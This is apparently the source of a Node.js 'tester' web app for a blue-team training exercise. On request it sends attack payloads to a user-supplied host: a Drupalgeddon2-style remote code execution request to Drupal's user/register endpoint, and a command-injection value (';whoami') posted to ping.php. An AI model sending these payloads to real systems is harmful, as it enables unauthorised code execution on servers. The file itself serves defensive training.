'use strict';

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const qs = require('qs');
const path = require('path');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const isValidDomain = require('is-valid-domain');
const isValidIP = require('ip-regex');
const app = express();
const PORT = 8081;
const HOST = '0.0.0.0'

var limiter = new rateLimit({
	windowsMS: 1 * 60 * 1000,
	max: 20,
	message: 'Too many request from this IP, please try again in one minute'
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("views"));
app.use(limiter);

axios.defaults.headers.post['Content-Type'] = 'application/x-www-form-urlencoded';

var masterSalt = "";
if(process.env.MASTER_SALT){ 
	masterSalt=process.env.MASTER_SALT;
} else {
	console.log('Expected MASTER_SALT env varaible to be set');
}

var dataCh1 = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]="
var dataCh2 = qs.stringify({
	name: ';whoami '
});

app.get('/*',(req, res) => {
	res.sendFile(path.join(__dirname, 'views/form.html'));
});

app.post('/attack',(req, res) => {
	const attck = req.body.host;
	const codeSalt = req.body.salt;
	const challenge = req.body.radio;
        var hash = crypto.createHash('sha256').update(challenge+codeSalt+masterSalt).digest('base64');

	//console.log('Host: '+ attck);
	//console.log('CodeSalt ' + codeSalt);
	//console.log('MasterSalt: ' + masterSalt);
	//console.log('Challenge: '+ challenge);
	//console.log('Hash ' + hash);
	
	if(isValidDomain(attck) || isValidIP({exact: true}).test(attck)){
		if(challenge == "blue_ch1") {
			axios.post(
				'http://' + attck + ':8080/user/register?element_parents=account/mail/#value&ajax_form=1&_wrapper_format=drupal_ajax',
				dataCh1 + hash,
			).then(function (response) {
				//console.log('Response:' + response);
			}).catch(function (error) {
				//console.log(error);
			});

		} else if (challenge == "blue_ch2"){
			axios.post(
				'http://' + attck + ':8888/ping.php',
				dataCh2 + hash,
			).then(function (response) {
				//console.log(response);
			})
			.catch(function (error) {
				//console.log(error);
			});
		} else {
        	        console.log("Challenge number is not valid");
       	 	}
		res.setHeader("Refresh", "7;url=/");
        	res.sendFile(path.join(__dirname, 'views/request.html'));
	} else {
		console.log("The host is not valid");
		res.setHeader("Refresh", "30;url=/");
		res.send("The host entered can not be used by our application, please use an ip address or a domain. Do not enter http:// or the port number!");
	}
});
app.listen(PORT, function () {
	console.log(`Tester application listening at ${HOST}:${PORT}`)
})
